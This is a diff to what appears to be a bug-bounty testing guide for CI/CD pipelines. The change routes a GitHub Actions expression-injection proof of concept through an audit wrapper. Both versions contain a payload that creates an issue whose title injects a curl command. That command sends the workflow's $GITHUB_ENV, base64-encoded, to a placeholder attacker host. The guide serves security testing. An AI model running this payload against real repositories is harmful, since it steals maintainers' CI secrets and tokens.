@@ -6,7 +6,7 @@ origin: AI Threat Hunting (adapted from claude-bug-bounty sisakulint integration
 
 # CI/CD Pipeline Security Testing
 
-> **Kali MCP audit header:** use `X-Technique: OTHER` for generic CI/CD abuse. Switch to `CMDI` or `RCE` when the pipeline step accepts attacker-controlled shell input, `AUTH` for token or secret leakage that grants further access, or `INFO-DISCLOSURE` for build-log exposure.
+> **`aith assess kali` audit flags:** use `--technique OTHER` for generic CI/CD abuse. Switch to `CMDI` or `RCE` when the pipeline step accepts attacker-controlled shell input, `AUTH` for token or secret leakage that grants further access, or `INFO-DISCLOSURE` for build-log exposure.
 
 ## When to Activate
 
@@ -207,13 +207,20 @@ github.head_ref
 
 ## Expression Injection PoC Template
 
+Target-facing PoC actions (creating issues/PRs to trigger vulnerable workflows) must go through `aith assess kali exec` so the action lands in the audit pipeline.
+
 ```bash
 # Step 1: Create an issue with injection payload in title
-gh issue create --repo TARGET/REPO \
-  --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' \
-  --body "test"
+# This is a target-facing action — run via aith assess kali exec with full audit flags
+aith assess kali exec \
+  --technique CMDI --intent "expression injection PoC via issue title on TARGET/REPO" \
+  --probe-kind exploit --phase consume-test --timeout 60 --destructive \
+  -- gh issue create --repo TARGET/REPO \
+     --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' \
+     --body "test"
 
 # Step 2: If workflow triggers on issues and interpolates title -> secrets exfiltrated
+# Check OOB callback hit with: aith oob client logs <name> --lines 80
 # CVSS: 9.3 Critical (RCE with repo secrets)
 ```
 
